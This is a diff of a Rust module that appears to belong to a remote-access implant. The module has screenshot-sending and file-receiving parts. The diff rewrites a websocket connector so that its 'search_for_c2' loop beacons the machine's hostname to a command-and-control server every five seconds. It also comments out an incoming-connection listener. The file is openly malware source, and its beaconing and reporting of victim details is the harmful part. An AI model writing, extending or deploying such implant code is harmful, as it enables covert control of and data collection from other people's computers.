@@ -1,16 +1,15 @@
 mod file_reciever;
 mod screenshot_sender;
 
-use std::thread::sleep;
-use std::time::Duration;
-use std::{net::TcpListener, thread::spawn};
-use tungstenite::handshake::client::Response;
-use tungstenite::{connect, Message};
+use std::{thread, time::Duration};
 
-use crate::SERVER;
+use futures_util::SinkExt;
 use gethostname::gethostname;
-use local_ip_address::local_ip;
-
+use tokio_tungstenite::{
+    connect_async,
+    tungstenite::{handshake::client::Response, http::response, Message},
+};
+use url::Url;
 pub struct Connector<'a> {
     //Server address sends data to main server
     socket_addr_server: &'a str,
@@ -21,42 +20,41 @@ impl<'a> Connector<'a> {
             socket_addr_server: address_server,
         }
     }
-    fn debug(response: Response) {
-        println!("Connected to the server");
-        println!("Response HTTP code: {}", response.status());
-        println!("Response contains the following headers:");
-        for (header, _value) in response.headers() {
-            println!("* {header}");
+    pub async fn send_data(&self, data: &str) {
+        match connect_async(self.socket_addr_server).await {
+            Ok((mut ws_stream, response)) => {
+                println!("Connected to the server");
+                match ws_stream.send(Message::Text(data.into())).await {
+                    Ok(_) => println!("Message sent successfully"),
+                    Err(e) => {
+                        println!("Connected to the server");
+                        println!("Response HTTP code: {}", response.status());
+                        println!("Response contains the following headers:");
+                        for (header, _value) in response.headers() {
+                            println!("* {header}");
+                        }
+                        eprintln!("Failed to send message: {}", e)
+                    }
+                }
+            }
+            Err(e) => eprintln!("Failed to connect: {}", e),
         }
     }
-    pub fn send_data(&self, data: &str) {
-        let (mut socket, response) = connect(self.socket_addr_server).expect("Can't connect");
-        //debug;
-        // Self::debug(response);
-        socket.send(Message::Text(data.into())).unwrap();
-        let _ = socket.close(None);
-    }
-    pub fn start_searching_for_c2(&self) {
-        let my_local_ip = local_ip().unwrap();
-        let hostname = gethostname();
-        //Im really not feeling like dealing with rust shenanigans rn
-        //Rewrtie later this piece of crap
-        let socket_addr_server = self.socket_addr_server.to_string();
+
+    pub async fn search_for_c2(&self) {
         loop {
-            println!("{}", &format!("ping|{:?}|{:?}", my_local_ip, hostname));
-            let mut internal_connector = Connector::new("ws://localhost:4000/socket");
-            internal_connector.send_data(&format!("ping|{:?}|{:?}", my_local_ip, hostname));
-            //ping every 5 seconds
-            //Reimplement later
-            sleep(Duration::from_secs(5));
+            self.send_data(&format!("ping|{}", gethostname().into_string().unwrap()))
+                .await;
+            thread::sleep(Duration::from_secs(5));
         }
     }
+    /*
     pub fn subscribe_for_updates(&self) {
         let server = TcpListener::bind(SERVER).unwrap();
         for stream in server.incoming() {
             let socket_addr_server = self.socket_addr_server.to_string();
             spawn(move || {
-                use tungstenite::accept;
+                use tokio_tungstenite::accept_async
 
                 let mut websocket = accept(stream.unwrap()).unwrap();
                 let mut writing = false;
@@ -77,4 +75,5 @@ impl<'a> Connector<'a> {
             });
         }
     }
+    */
 }
